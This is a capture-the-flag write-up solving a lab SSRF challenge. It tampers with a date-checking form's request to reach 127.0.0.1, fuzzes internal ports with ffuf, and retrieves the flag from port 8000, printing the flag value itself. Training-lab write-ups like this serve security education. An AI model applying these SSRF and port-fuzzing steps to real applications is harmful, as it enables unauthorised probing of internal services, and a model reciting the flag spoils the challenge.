## Challenge 

Exploit a SSRF vulnerability to identify an internal web application. Access the internal application to obtain the flag. 

## Solution

After checking for the availability of a date, I send the request to Burp Repeater, and I see the body of the `POST` request is:

```http
dateserver=http://dateserver.htb/availability.php&date=2024-01-16
```

Now, let's try to access the internal server, and observe the response. Send the request using Burp Repeater with the following body:

```http
dateserver=http://127.0.0.1&date=2024-01-16
```

We receive a `200 OK` meaning that we got SSRF, and we can check for internal services.

Now let's use `ffuf` to brute-force and check for any other available ports.

```sh
ffuf -w ports.txt -u http://10.129.201.127/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-1" -fr "Failed to connect to"
```

And I got three ports:

```sh
80                      [Status: 200, Size: 8285, Words: 2151, Lines: 158, Duration: 3656ms]
3306                    [Status: 200, Size: 45, Words: 7, Lines: 1, Duration: 97ms]
8000                    [Status: 200, Size: 37, Words: 1, Lines: 1, Duration: 27ms]
```

Let's try `3306` and `8000` on Burp Repeater.

For the `3306` the response was `Error (1): Received HTTP/0.9 when not allowed` and for the port `8000` I got the flag `HTB{911fc5badf7d65aed95380d536c270f8}`.

This was done by sending a request with the following body:

```sh
dateserver=http://127.0.0.1:8000&date=2024-01-01
```

